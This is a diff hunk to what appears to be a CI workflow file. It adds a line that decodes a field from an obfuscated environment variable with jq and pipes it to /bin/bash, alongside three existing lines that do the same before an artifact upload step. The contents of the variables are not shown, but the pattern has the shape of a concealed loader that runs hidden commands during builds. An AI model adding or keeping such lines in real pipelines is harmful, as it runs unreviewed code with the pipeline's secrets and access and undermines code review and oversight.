@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$wbsaj7247" | jq -r .x3068 | /bin/bash
           echo $dro085 | jq -r .pzpo765 | /bin/bash
           echo $wp314 | jq -r .m7473 | /bin/bash
+          printf '%s' "$mceg54" | jq -r .pfcq7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
